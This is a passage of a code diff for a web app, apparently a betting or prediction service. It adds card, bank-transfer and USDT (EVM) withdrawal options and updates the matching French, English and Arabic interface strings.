+    dest={kind:'crypto_usdt_evm',clientRef:'USDT-EVM-WD-'+Date.now(),address,requestedAt:new Date().toISOString(),usdtRate:withdrawUsdtGbpRate>0?withdrawUsdtGbpRate:null,usdtAmount:withdrawUsdtGbpRate>0?+(withdrawalNet(amount)/withdrawUsdtGbpRate).toFixed(4):null};successLabel='USDT · EVM';successDetail=t('withdrawSuccessCrypto');
+  }else return;
+  const btn=document.getElementById('withdrawConfirmBtn');btn.disabled=true;btn.innerHTML=`<div class="spinner" style="width:20px;height:20px;border-width:2.5px;margin:0"></div> ${t('withdrawalProcessing')}`;
+  runWithdrawal(dest,amount,({net})=>{document.getElementById('withdrawSheetBody').innerHTML=`<div class="withdraw-success"><div class="ic">✅</div><div style="font-family:'Baloo 2';font-weight:800;font-size:18px;margin-top:10px">${t('withdrawalSuccessTitle')}</div><div style="font-size:13px;color:var(--ink-soft);font-weight:700;margin-top:6px">${fmtAmt(net)} GBP</div><div style="font-size:12px;color:var(--ink-soft);font-weight:700;margin-top:6px">${successDetail}</div><div style="font-size:12px;color:var(--ink-soft);margin-top:6px">${successLabel}</div><button class="btn btn-primary" style="margin-top:20px" onclick="closeWithdrawSheet()">${t('close')}</button></div>`;}).catch(err=>{errBox.textContent=withdrawalErrorMessage(err);errBox.classList.add('show');btn.disabled=false;btn.innerHTML=`💸 ${t('confirmWithdrawal')}`;});
 }
 /* ---------- Langue ---------- */
 const translations = {
@@ -15193,11 +15111,12 @@ const translations = {
     vipKeepPlaying:"Continue de jouer pour débloquer des avantages",
     myTransactions:"Mes transactions", noTransactionsYet:"Aucune transaction pour le moment.",
     withdrawalLabel:"Retrait par virement bancaire", withdrawalCardLabel:"Retrait par carte bancaire",
-    withdrawSheetTitle:"Retirer mes gains", availableBalance:"Solde disponible",
+    withdrawMethodTitle:"Choisissez une méthode de retrait", withdrawMethodCard:"Carte bancaire", withdrawMethodCardSub:"Retrait sur carte", withdrawMethodBank:"Virement bancaire", withdrawMethodBankSub:"IBAN / BIC", withdrawMethodCrypto:"USDT · EVM", withdrawMethodCryptoSub:"Adresse 0x…", cryptoDetailsTitle:"Adresse crypto", cryptoAddressLabel:"Adresse USDT (EVM)", cryptoAddressHint:"Utilisez uniquement une adresse compatible EVM (0x…).", cryptoAddressInvalid:"Adresse USDT EVM invalide.", cardNumberInvalid:"Numéro de carte invalide.", withdrawSuccessCard:"Votre demande est en cours de traitement sur votre carte.", withdrawSuccessBank:"Votre demande est en cours de traitement sur votre compte bancaire.", withdrawSuccessCrypto:"Votre demande USDT est en cours de traitement sur le réseau EVM.",
+    withdrawSheetTitle:"Retrait", availableBalance:"Solde disponible",
     withdrawAmountLabel:"Montant à retirer", maxAmount:"Max",
     bankDetailsTitle:"Coordonnées bancaires", bankHolderLabel:"Titulaire du compte", bankHolderPlaceholder:"Ex. : James Wilson",
     bankNameLabel:"Nom de la banque", bankIbanPlaceholder:"GB29 NWBK 6016 1331 9268 19", bankBicPlaceholder:"NWBKGB2L",
-    withdrawDelayNote:"Délai de traitement : 24 à 72 h maximum après validation de votre demande. Vérifiez bien vos coordonnées bancaires.",
+    withdrawDelayNote:"Délai de traitement.", withdrawDelayCard:"Délai carte : 24 à 72 h après validation.", withdrawDelayBank:"Délai virement : 1 à 3 jours ouvrés après validation.", withdrawDelayCrypto:"Délai USDT EVM : généralement 5 à 30 minutes après validation et selon la confirmation du réseau.", usdtExchangeRate:"Taux USDT", usdtRateLoading:"Chargement du taux…", usdtRateUnavailable:"Taux indisponible", usdtRateRequired:"Le taux USDT est indisponible. Réessayez dans un instant.", usdtToReceive:"USDT à recevoir",
     bankNamePlaceholder:"Ex. : Barclays, HSBC, NatWest (Londres)", bankIbanLabel:"IBAN / Numéro de compte", bankBicLabel:"BIC / SWIFT",
     depositLabel:"Dépôt", rejectedStatus:"refusé",
     toastDepositRequestSent:"Demande de dépôt envoyée à l’administration", toastDepositRequestFailed:"Impossible d’envoyer la demande de dépôt. Réessaie plus tard.",
@@ -15226,7 +15145,7 @@ const translations = {
     minWithdrawalNote:(p)=>`Montant minimum de retrait : ${p.min} GBP`,
     withdrawAddressRequired:"Merci de renseigner une adresse de destination valide.",
     withdrawalProcessing:"Traitement en cours…",
-    withdrawalSuccessTitle:"Retrait envoyé !",
+    withdrawalSuccessTitle:"Votre demande est en cours de traitement",
     withdrawalSuccessSub:(p)=>`${p.amount} GBP seront virés sur votre compte bancaire sous 24 à 72 h maximum.`,
     close:"Fermer",
     activateSession:"Activer ma session", goPlayToday:"Voir mes pronostics du jour",
@@ -16113,11 +16032,12 @@ lcDest_secureInfoSub:"et utilisées uniquement pour le traitement de votre deman
     vipKeepPlaying:"Keep playing to unlock benefits",
     myTransactions:"My transactions", noTransactionsYet:"No transactions yet.",
     withdrawalLabel:"Bank transfer withdrawal", withdrawalCardLabel:"Bank card withdrawal",
-    withdrawSheetTitle:"Withdraw my winnings", availableBalance:"Available balance",
+    withdrawMethodTitle:"Choose a withdrawal method", withdrawMethodCard:"Bank card", withdrawMethodCardSub:"Withdraw to card", withdrawMethodBank:"Bank transfer", withdrawMethodBankSub:"IBAN / BIC", withdrawMethodCrypto:"USDT · EVM", withdrawMethodCryptoSub:"0x… address", cryptoDetailsTitle:"Crypto address", cryptoAddressLabel:"USDT address (EVM)", cryptoAddressHint:"Use only an EVM-compatible address (0x…).", cryptoAddressInvalid:"Invalid USDT EVM address.", cardNumberInvalid:"Invalid card number.", withdrawSuccessCard:"Your withdrawal request is being processed on your card.", withdrawSuccessBank:"Your withdrawal request is being processed on your bank account.", withdrawSuccessCrypto:"Your USDT withdrawal request is being processed on the EVM network.",
+    withdrawSheetTitle:"Withdrawal", availableBalance:"Available balance",
     withdrawAmountLabel:"Amount to withdraw", maxAmount:"Max",
     bankDetailsTitle:"Bank details", bankHolderLabel:"Account holder", bankHolderPlaceholder:"e.g. James Wilson",
     bankNameLabel:"Bank name", bankIbanPlaceholder:"GB29 NWBK 6016 1331 9268 19", bankBicPlaceholder:"NWBKGB2L",
-    withdrawDelayNote:"Processing time: 24 to 72 hours maximum after your request is approved. Please double-check your bank details.",
+    withdrawDelayNote:"Processing time.", withdrawDelayCard:"Card processing: 24 to 72 hours after approval.", withdrawDelayBank:"Bank transfer: 1 to 3 business days after approval.", withdrawDelayCrypto:"USDT EVM: usually 5 to 30 minutes after approval, depending on network confirmation.", usdtExchangeRate:"USDT rate", usdtRateLoading:"Loading rate…", usdtRateUnavailable:"Rate unavailable", usdtRateRequired:"The USDT rate is unavailable. Please try again shortly.", usdtToReceive:"USDT to receive",
     bankNamePlaceholder:"e.g. Barclays, HSBC, NatWest (London)", bankIbanLabel:"IBAN / Account number", bankBicLabel:"BIC / SWIFT",
     depositLabel:"Deposit", rejectedStatus:"rejected",
     toastDepositRequestSent:"Deposit request sent to the administration", toastDepositRequestFailed:"Could not send the deposit request. Please try again later.",
@@ -16146,7 +16066,7 @@ lcDest_secureInfoSub:"et utilisées uniquement pour le traitement de votre deman
     minWithdrawalNote:(p)=>`Minimum withdrawal amount: ${p.min} GBP`,
     withdrawAddressRequired:"Please enter a valid destination address.",
     withdrawalProcessing:"Processing…",
-    withdrawalSuccessTitle:"Withdrawal sent!",
+    withdrawalSuccessTitle:"Your withdrawal request is being processed",
     withdrawalSuccessSub:(p)=>`${p.amount} GBP will be transferred to your bank account within 24 to 72 hours maximum.`,
     close:"Close",
     activateSession:"Activate my session", goPlayToday:"Go play today's numbers",
@@ -17033,11 +16953,12 @@ lcDest_secureInfoSub:"and used only to process your request.",
     vipKeepPlaying:"استمر في اللعب لفتح المزايا",
     myTransactions:"معاملاتي", noTransactionsYet:"لا توجد معاملات بعد.",
     withdrawalLabel:"سحب عبر تحويل بنكي", withdrawalCardLabel:"سحب عبر بطاقة مصرفية",
-    withdrawSheetTitle:"سحب أرباحي", availableBalance:"الرصيد المتاح",
+    withdrawMethodTitle:"اختر طريقة السحب", withdrawMethodCard:"بطاقة مصرفية", withdrawMethodCardSub:"السحب إلى البطاقة", withdrawMethodBank:"تحويل بنكي", withdrawMethodBankSub:"IBAN / BIC", withdrawMethodCrypto:"USDT · EVM", withdrawMethodCryptoSub:"عنوان 0x…", cryptoDetailsTitle:"عنوان العملة الرقمية", cryptoAddressLabel:"عنوان USDT (EVM)", cryptoAddressHint:"استخدم عنوانًا متوافقًا مع EVM فقط (0x…).", cryptoAddressInvalid:"عنوان USDT EVM غير صالح.", cardNumberInvalid:"رقم البطاقة غير صالح.", withdrawSuccessCard:"طلب السحب الخاص بك قيد المعالجة على بطاقتك.", withdrawSuccessBank:"طلب السحب الخاص بك قيد المعالجة على حسابك البنكي.", withdrawSuccessCrypto:"طلب سحب USDT الخاص بك قيد المعالجة على شبكة EVM.",
+    withdrawSheetTitle:"السحب", availableBalance:"الرصيد المتاح",
     withdrawAmountLabel:"المبلغ المراد سحبه", maxAmount:"الحد الأقصى",
     bankDetailsTitle:"البيانات البنكية", bankHolderLabel:"اسم صاحب الحساب", bankHolderPlaceholder:"مثال: James Wilson",
     bankNameLabel:"اسم البنك", bankIbanPlaceholder:"GB29 NWBK 6016 1331 9268 19", bankBicPlaceholder:"NWBKGB2L",
-    withdrawDelayNote:"مدة المعالجة: من 24 إلى 72 ساعة كحد أقصى بعد الموافقة على طلبك. يرجى التأكد من صحة بياناتك البنكية.",
+    withdrawDelayNote:"مدة المعالجة.", withdrawDelayCard:"البطاقة: من 24 إلى 72 ساعة بعد الموافقة.", withdrawDelayBank:"التحويل البنكي: من يوم إلى 3 أيام عمل بعد الموافقة.", withdrawDelayCrypto:"USDT EVM: عادةً من 5 إلى 30 دقيقة بعد الموافقة، حسب تأكيد الشبكة.", usdtExchangeRate:"سعر USDT", usdtRateLoading:"جارٍ تحميل السعر…", usdtRateUnavailable:"السعر غير متاح", usdtRateRequired:"سعر USDT غير متاح. حاول مرة أخرى بعد قليل.", usdtToReceive:"USDT المستلم",
     bankNamePlaceholder:"مثال: Barclays, HSBC, NatWest (لندن)", bankIbanLabel:"IBAN / رقم الحساب", bankBicLabel:"BIC / SWIFT",
     depositLabel:"إيداع", rejectedStatus:"مرفوض",
     toastDepositRequestSent:"تم إرسال طلب الإيداع إلى الإدارة", toastDepositRequestFailed:"تعذّر إرسال طلب الإيداع. أعد المحاولة لاحقًا.",
@@ -17066,7 +16987,7 @@ lcDest_secureInfoSub:"and used only to process your request.",
     minWithdrawalNote:(p)=>`الحد الأدنى لمبلغ السحب: ${p.min} GBP`,
     withdrawAddressRequired:"يرجى إدخال عنوان وجهة صالح.",
     withdrawalProcessing:"جارٍ المعالجة…",
-    withdrawalSuccessTitle:"تم إرسال السحب!",
+    withdrawalSuccessTitle:"طلب السحب قيد المعالجة",
     withdrawalSuccessSub:(p)=>`سيتم تحويل ${p.amount} GBP إلى حسابك البنكي خلال 24 إلى 72 ساعة كحد أقصى.`,
     close:"إغلاق",
     activateSession:"تفعيل جلستي", goPlayToday:"العب أرقام اليوم",
